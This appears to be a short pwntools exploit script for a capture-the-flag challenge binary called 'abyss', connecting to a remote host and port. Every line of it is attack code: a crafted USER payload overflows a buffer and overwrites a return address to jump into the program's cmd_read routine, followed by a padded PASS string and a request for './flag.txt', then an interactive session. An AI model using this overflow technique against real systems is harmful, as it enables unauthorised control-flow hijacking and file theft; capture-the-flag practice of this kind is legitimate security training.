#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./abyss',checksec=False)

#p = process()
p = remote('83.136.254.60',41625)
#gdb.attach(p,gdbscript='''
#            b*main+470
#            b*cmd_login+155
#            b*cmd_read+66
#           ''')

input()

p.send(p32(0))

sleep(1)
payload = b'USER ' + b'a'*3
payload += b'a'*8
payload += b'a'*6 + b'\x1c' + b'a'
payload += b'a'*8
payload += b'a'*2
payload += p64(exe.sym.cmd_read + 66) 

p.send(payload)
sleep(3)
payload = b"PASS " + b"b"*507
p.send(payload)
sleep(1)
payload = b'./flag.txt\x00'
p.send(payload)




p.interactive()
